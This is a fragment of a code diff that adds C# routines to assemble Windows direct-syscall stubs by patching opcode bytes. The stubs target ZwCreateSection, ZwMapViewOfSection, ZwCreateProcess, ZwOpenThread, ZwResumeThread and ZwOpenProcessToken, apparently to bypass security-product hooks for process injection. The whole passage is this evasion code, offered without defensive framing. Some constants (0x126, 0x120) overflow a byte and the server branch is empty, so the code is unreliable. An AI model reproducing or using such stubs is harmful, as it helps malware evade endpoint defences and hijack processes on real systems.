+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x17);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 5: // ZwCreateSection
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x49);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 6: // ZwMapViewOfSection
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x27);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 7: // ZwCreateProcess
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0xB3);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 8: // ZwOpenThread
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x126);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                   }
+                   break;
+
+                   case 9: // ZwResumeThread
+                   unsafe
+                   {
+                       fixed (byte* ptr = syscall)
+                       {
+                           *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                           *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                           *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                           *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                           *(ptr + 4) = (byte) ( *(ptr + 4) + 0x51);
+                           *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                           *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                           *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                           *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                           *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                           *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                       }
+                  }
+                  break;
+
+                  case 10: // ZwOpenProcessToken
+                  unsafe
+                  {
+                      fixed (byte* ptr = syscall)
+                      {
+                          *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                          *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                          *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                          *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                          *(ptr + 4) = (byte) ( *(ptr + 4) + 0x120);
+                          *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                          *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                          *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                          *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                          *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                          *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                      }
+                 }
+                 break;
+
+               } // switch (sysType)
+            }  // if
+        }  // Client OS
+            else
+            if (osVersionInfo.dwPlatformId == 3) // Server OS
+            {
+            }
+
+            return syscall;
+    }
+
+
+
+
 }
+
 
 
 ```
